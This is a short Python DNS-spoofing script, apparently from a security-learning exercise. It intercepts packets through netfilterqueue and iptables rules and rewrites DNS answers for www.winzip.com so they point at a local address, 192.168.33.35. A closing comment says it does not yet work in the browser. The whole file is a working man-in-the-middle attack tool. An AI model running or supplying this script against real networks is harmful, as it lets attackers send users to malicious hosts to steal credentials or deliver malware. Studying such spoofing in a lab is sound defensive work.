#!/usr/bin/env python 
#iptables -I FORWARD -j NFQUEUE --queue-num 0
#iptables --flush   -F [chain]          Delete all rules in  chain or all chains
#iptables -I INPUT -j NFQUEUE --queue-num 0
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#pip install netfilterqueue
#ping -c 1 www.bing.com
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        website = b"www.winzip.com"
        if website in qname:

            print("[+] Spoofing target...")
            answer = scapy.DNSRR(rrname=qname,rdata="192.168.33.35")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(bytes(scapy_packet))
    packet.accept()
queue = netfilterqueue.NetfilterQueue()
try:
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] User requested program termination...")


##################****NOTE*****#############

#this program doesn't work in broswer CHECK LATER